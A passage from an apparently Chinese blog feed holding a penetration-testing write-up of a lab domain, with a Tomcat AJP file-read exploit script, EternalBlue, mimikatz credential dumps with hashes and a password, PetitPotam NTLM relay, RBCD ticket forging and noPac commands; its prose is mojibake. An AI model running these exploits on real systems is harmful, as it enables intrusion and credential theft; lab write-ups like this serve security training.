\0</span></span><br><span class="line">h_value = unpack_string(stream)</span><br><span class="line">self.request_headers[h_name] = h_value</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_and_receive</span>(<span class="params">self, socket, stream, save_cookies=<span class="literal">False</span></span>):</span><br><span class="line">res = []</span><br><span class="line">i = socket.sendall(self.serialize())</span><br><span class="line"><span class="keyword">if</span> self.method == AjpForwardRequest.POST:</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line"><span class="keyword">assert</span> r.prefix_code == AjpResponse.SEND_HEADERS</span><br><span class="line">res.append(r)</span><br><span class="line"><span class="keyword">if</span> save_cookies <span class="keyword">and</span> <span class="string">&#x27;Set-Cookie&#x27;</span> <span class="keyword">in</span> r.response_headers:</span><br><span class="line">self.headers[<span class="string">&#x27;SC_REQ_COOKIE&#x27;</span>] = r.response_headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># read body chunks and end response packets</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line">res.append(r)</span><br><span class="line"><span class="keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AjpResponse</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = <span class="built_in">range</span>(<span class="number">7</span>)</span><br><span class="line">COMMON_SEND_HEADERS = [</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;Content-Language&quot;</span>, <span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;Date&quot;</span>, <span class="string">&quot;Last-Modified&quot;</span>,</span><br><span class="line"><span class="string">&quot;Location&quot;</span>, <span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;Set-Cookie2&quot;</span>, <span class="string">&quot;Servlet-Engine&quot;</span>, <span class="string">&quot;Status&quot;</span>, <span class="string">&quot;WWW-Authenticate&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, stream</span>):</span><br><span class="line"><span class="comment"># read headers</span></span><br><span class="line">self.magic, self.data_length, self.prefix_code = unpack(stream, <span class="string">&quot;&gt;HHb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> self.prefix_code == AjpResponse.SEND_HEADERS:</span><br><span class="line">self.parse_send_headers(stream)</span><br><span class="line"><span class="keyword">elif</span> self.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">self.parse_send_body_chunk(stream)</span><br><span class="line"><span class="keyword">elif</span> self.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">self.parse_end_response(stream)</span><br><span class="line"><span class="keyword">elif</span> self.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><br><span class="line">self.parse_get_body_chunk(stream)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_send_headers</span>(<span class="params">self, stream</span>):</span><br><span class="line">self.http_status_code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">self.http_status_msg = unpack_string(stream)</span><br><span class="line">self.num_headers, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">self.response_headers = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.num_headers):</span><br><span class="line">code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> code &lt;= <span class="number">0xA000</span>: <span class="comment"># custom header</span></span><br><span class="line">h_name, = unpack(stream, <span class="string">&quot;%ds&quot;</span> % code)</span><br><span class="line">stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">h_value = unpack_string(stream)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">h_name = AjpResponse.COMMON_SEND_HEADERS[code-<span class="number">0xA001</span>]</span><br><span class="line">h_value = unpack_string(stream)</span><br><span class="line">self.response_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_send_body_chunk</span>(<span class="params">self, stream</span>):</span><br><span class="line">self.data_length, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">self.data = stream.read(self.data_length+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_end_response</span>(<span class="params">self, stream</span>):</span><br><span class="line">self.reuse, = unpack(stream, <span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_get_body_chunk</span>(<span class="params">self, stream</span>):</span><br><span class="line">rlen, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> rlen</span><br><span class="line"></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive</span>(<span class="params">stream</span>):</span><br><span class="line">r = AjpResponse()</span><br><span class="line">r.parse(stream)</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_ajp_forward_request</span>(<span class="params">target_host, req_uri, method=AjpForwardRequest.GET</span>):</span><br><span class="line">fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">fr.method = method</span><br><span class="line">fr.protocol = <span class="string">&quot;HTTP/1.1&quot;</span></span><br><span class="line">fr.req_uri = req_uri</span><br><span class="line">fr.remote_addr = target_host</span><br><span class="line">fr.remote_host = <span class="literal">None</span></span><br><span class="line">fr.server_name = target_host</span><br><span class="line">fr.server_port = <span class="number">80</span></span><br><span class="line">fr.request_headers = &#123;</span><br><span class="line"><span class="string">&#x27;SC_REQ_ACCEPT&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;SC_REQ_CONNECTION&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;SC_REQ_CONTENT_LENGTH&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;SC_REQ_HOST&#x27;</span>: target_host,</span><br><span class="line"><span class="string">&#x27;SC_REQ_USER_AGENT&#x27;</span>: <span class="string">&#x27;Mozilla&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, sdch&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">fr.is_ssl = <span class="literal">False</span></span><br><span class="line">fr.attributes = []</span><br><span class="line"><span class="keyword">return</span> fr</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tomcat</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_host, target_port</span>):</span><br><span class="line">self.target_host = target_host</span><br><span class="line">self.target_port = target_port</span><br><span class="line"></span><br><span class="line">self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">self.socket.connect((target_host, target_port))</span><br><span class="line">self.stream = self.socket.makefile(<span class="string">&quot;rb&quot;</span>, bufsize=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">perform_request</span>(<span class="params">self, req_uri, headers=&#123;&#125;, method=<span class="string">&#x27;GET&#x27;</span>, user=<span class="literal">None</span>, password=<span class="literal">None</span>, attributes=[]</span>):</span><br><span class="line">self.req_uri = req_uri</span><br><span class="line">self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Getting resource at ajp13://%s:%d%s&quot;</span> % (self.target_host, self.target_port, req_uri))</span><br><span class="line"><span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> password <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">self.forward_request.request_headers[<span class="string">&#x27;SC_REQ_AUTHORIZATION&#x27;</span>] = <span class="string">&quot;Basic &quot;</span> + (<span class="string">&quot;%s:%s&quot;</span> % (user, password)).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> headers:</span><br><span class="line">self.forward_request.request_headers[h] = headers[h]</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> attributes:</span><br><span class="line">self.forward_request.attributes.append(a)</span><br><span class="line">responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(responses) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">snd_hdrs_res = responses[<span class="number">0</span>]</span><br><span class="line">data_res = responses[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(data_res) == <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;No data in response. Headers:%s\n&quot;</span> % snd_hdrs_res.response_headers)</span><br><span class="line"><span class="keyword">return</span> snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">javax.servlet.include.request_uri</span></span><br><span class="line"><span class="string">javax.servlet.include.path_info</span></span><br><span class="line"><span class="string">javax.servlet.include.servlet_path</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;target&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Hostname or IP to attack&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">8009</span>, <span class="built_in">help</span>=<span class="string">&quot;AJP port to attack (default is 8009)&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;WEB-INF/web.xml&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;file path :(WEB-INF/web.xml)&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">t = Tomcat(args.target, args.port)</span><br><span class="line">_,data = t.perform_request(<span class="string">&#x27;/asdf.jsp&#x27;</span>,attributes=[</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.request_uri&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.path_info&#x27;</span>,args.file]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.servlet_path&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]&#125;,</span><br><span class="line">    ])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------------------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([d.data <span class="keyword">for</span> d <span class="keyword">in</span> data]))</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shellå‘ç°ç›´æ¥æ˜¯rootæƒé™ï¼Œè¯»å–flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /r*/f*/f*</span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">./fs -h 172.22.11.1/24 -o result.txt</span><br><span class="line"></span><br><span class="line">172.22.11.45:445 open</span><br><span class="line">172.22.11.26:445 open</span><br><span class="line">172.22.11.6:445 open</span><br><span class="line">172.22.11.45:139 open</span><br><span class="line">172.22.11.26:139 open</span><br><span class="line">172.22.11.26:135 open</span><br><span class="line">172.22.11.45:135 open</span><br><span class="line">172.22.11.6:135 open</span><br><span class="line">172.22.11.76:8080 open</span><br><span class="line">172.22.11.6:88 open</span><br><span class="line">172.22.11.6:139 open</span><br><span class="line">172.22.11.76:8009 open</span><br><span class="line">172.22.11.76:22 open</span><br><span class="line">[*] NetBios: 172.22.11.6     [+]DC XIAORANG\XIAORANG-DC     </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.11.6</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.11.6</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.11.26</span><br><span class="line">   [-&gt;]XR-LCM3AE8B</span><br><span class="line">   [-&gt;]172.22.11.26</span><br><span class="line">[*] NetBios: 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1 </span><br><span class="line">[*] NetBios: 172.22.11.26    XIAORANG\XR-LCM3AE8B           </span><br><span class="line">[+] 172.22.11.45MS17-010(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle: http://172.22.11.76:8080  code:200 len:7091   title:åå°ç®¡ç†</span><br></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥çš„ä¿¡æ¯å¹¶ä¸å¤šï¼Œå¯ä»¥å‘ç°6ï¼Œä¹Ÿå°±æ˜¯åŸŸæ§å¼€å¯äº†88ç«¯å£ï¼Œå¯èƒ½æ˜¯è¦æ‰“è¯ä¹¦ä¹‹ç±»çš„æ¼æ´ï¼Œå…¶æ¬¡æ˜¯æ‰«å‡ºæ¥ä¸€ä¸ªæ°¸æ’ä¹‹è“ï¼Œå…ˆæŠŠæ°¸æ’ä¹‹è“æ‰“äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload  payload/windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhosts 172.22.11.45</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>ç›´æ¥systemæƒé™ï¼Œæ‹¿åˆ°ç¬¬äºŒä¸ªflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> C:/users/administrator/flag/flag02.txt</span><br></pre></td></tr></table></figure><h2 id="flag03">flag03</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†æœºå™¨è´¦æˆ·å’Œyangmeiçš„å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username     Domain    NTLM                              SHA1</span><br><span class="line">--------     ------    ----                              ----</span><br><span class="line">XR-DESKTOP$  XIAORANG  646f21852fb4de18e9cca504854c789e  86a8eea22535477e8d2426ab7d22afa099a441cf</span><br><span class="line">yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰yangmeiçš„æ˜æ–‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yangmei:xrihGHgoNZQ</span><br></pre></td></tr></table></figure><p>å‚è€ƒåšå®¢ï¼š<a href="https://whoamianony.top/posts/privilege-escalation-ntlmrelay2self-over-http-webdav/#ntlm-relay-over-http-webdav">https://whoamianony.top/posts/privilege-escalation-ntlmrelay2self-over-http-webdav/#ntlm-relay-over-http-webdav</a></p><p>ç®€å•æ¥è¯´è¿™é‡Œçš„ç‰¹åˆ«ä¹‹å¤„å°±æ˜¯ä½¿ç”¨httpåè®®æ¥ç»•è¿‡èº«ä»½éªŒè¯ï¼Œå…ˆæ‰«ä¸€ä¸‹è¿™é‡Œæ˜¯å¦å…·å¤‡åˆ©ç”¨æ¡ä»¶å§ï¼ˆå³å¼€å¯ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M Webdav 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°åªæœ‰26å¼€å¯äº†webclientæœåŠ¡ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šæ”»å‡»ç›®æ ‡å°±æ˜¯26è¿™å°æœºå™¨äº†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240807014815684.png" alt="image-20240807014815684"></p><p>åé¢çš„æ€è·¯å°±æ˜¯åˆ©ç”¨æ¼æ´å¼ºåˆ¶è®©26è®¿é—®ä¸­ç»§ï¼Œè·å–å¯¹åº”çš„TGTï¼Œå†åˆ©ç”¨è·å–çš„TGTç”³è¯·STï¼Œè¿›è€Œå¯¹26æ¨ªå‘ã€‚</p><p>ä½†è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œåšå®¢ä¸­åˆ©ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:8080,reuseaddr,fork tcp:192.168.2.148:80</span><br></pre></td></tr></table></figure><p>å°†è¢«æ§æœº8080ç«¯å£çš„æµé‡è½¬å‘åˆ°äº†192.168.2.148çš„80ç«¯å£ï¼Œè€Œæˆ‘ä»¬çš„kaliæ˜¯åœ¨å†…ç½‘ï¼Œæ²¡æ³•ç›´æ¥è½¬å‘è¿‡æ¥ï¼Œæ‰€ä»¥è§£å†³æ–¹æ³•æœ‰ä¸¤ä¸ª</p><p>1.ç›´æ¥åœ¨VPSä¸Šå¼€å¯ä¸­ç»§</p><p>2.å°†æœ¬åœ°kaliçš„ç«¯å£æ˜ å°„åˆ°VPSä¸Š</p><p>è¿™é‡Œç”±äºæˆ‘VPSçš„ç¯å¢ƒæ²¡é…ç½®ï¼Œæ‰€ä»¥å°±ä½¿ç”¨äº†ç¬¬äºŒç§æ–¹æ³•è§£å†³</p><p><strong>frpc.ini</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = vpsip</span><br><span class="line">server_port = 7099</span><br><span class="line"></span><br><span class="line">[plugin_socks6]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 8848</span><br><span class="line">local_port = 80</span><br><span class="line">local_ip = 127.0.0.1</span><br></pre></td></tr></table></figure><p><strong>frps.ini</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7099</span><br><span class="line"></span><br><span class="line">[tcp_1200]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">local_ip = 127.0.0.1 </span><br><span class="line">local_port = 8848</span><br></pre></td></tr></table></figure><p>è¢«æ§æœºå™¨ï¼šå°†æœ¬åœ°80ç«¯å£çš„æµé‡è½¬å‘åˆ°vpsçš„8848ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:80,reuseaddr,fork tcp:vpsip:8848</span><br></pre></td></tr></table></figure><p>æœ¬åœ°kaliï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>VPSï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p>æ­å»ºå¥½äº†ä¹‹åå¯ä»¥ä¸Šæ‹¿ä¸‹çš„win7ä¸»æœºcurlä¸€ä¸‹ï¼Œçœ‹çœ‹æœ¬åœ°æ˜¯å¦èƒ½å¤Ÿæ”¶åˆ°å¯¹åº”æµé‡ï¼Œå¯ä»¥çœ‹åˆ°æœ¬åœ°ç¡®å®æ”¶åˆ°äº†å¯¹åº”æµé‡</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240807021733543.png" alt="image-20240807021733543"></p><p>1.kaliå¼€å¯ä¸­ç»§ç›‘å¬80</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-ntlmrelayx -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user <span class="string">&#x27;xr-desktop$&#x27;</span> --delegate-access</span><br></pre></td></tr></table></figure><p>2.åˆ©ç”¨PetitPotamæ¼æ´å¼ºåˆ¶è®¿é—®76æœºå™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PetitPotam.py -u yangmei -p xrihGHgoNZQ -d xiaorang.lab ubuntu@80/webdav 172.22.11.26</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸­ç»§çš„ä½œç”¨å…¶å®å°±æ˜¯ä¿®æ”¹äº†æœºå™¨è´¦æˆ·çš„msDS-AllowedToActOnBehalfOfOtherIdentity</p><p>å…·ä½“å¯ä»¥å‚è€ƒè¿™é‡Œæ‰€è¯´çš„RBCDçš„ç¬¬ä¸‰ç§æ‰“æ³•ï¼š<a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p><p>3.åˆ©ç”¨æœºå™¨è´¦æˆ·ç”³è¯·STç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :646f21852fb4de18e9cca504854c789e  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6</span><br></pre></td></tr></table></figure><p>4.å¯¼å…¥STç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB.ccache</span><br></pre></td></tr></table></figure><p>5.æ¨ªå‘26æœºå™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -target-ip 172.22.11.26 -k XR-LCM3AE8B.xiaorang.lab -no-pass</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°ç¬¬ä¸‰ä¸ªflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\<span class="built_in">users</span>\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure><h2 id="flag04">flag04</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240807035641925.png" alt="image-20240807035641925"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240807035927937.png" alt="image-20240807035927937"></p><p>å‘ç°å­˜åœ¨MA_Adminç»„ï¼Œå¯ä»¥æ·»åŠ è´¦æˆ·ï¼Œåˆ©ç”¨mimikatzæŠ“å–ä¸€æ³¢å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;&quot;</span>privilege::debug<span class="string">&quot;&quot;</span> <span class="string">&quot;&quot;</span>sekurlsa::logonpasswords<span class="string">&quot;&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[00000003] Primary</span><br><span class="line">       * Username : zhanghui</span><br><span class="line">       * Domain   : XIAORANG</span><br><span class="line">       * NTLM     : 1232126b24cdf8c9bd2f788a9d7c7ed1</span><br><span class="line">       * SHA1     : f3b66ff457185cdf5df6d0a085dd8935e226ba65</span><br><span class="line">       * DPAPI    : 4bfe751ae03dc1517cfb688adc506154</span><br></pre></td></tr></table></figure><p>å¾—åˆ°zhanghuiçš„å“ˆå¸Œï¼Œåˆ©ç”¨npacè·å–dcæƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python noPac.py xiaorang.lab/zhanghui -hashes :1232126b24cdf8c9bd2f788a9d7c7ed1 -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag04</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\<span class="built_in">users</span>\administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Initial</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Initial.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Initial.html</id>
    <published>2024-08-20T15:21:54.627Z</published>
    <updated>2024-08-20T15:35:20.391Z</updated>
    
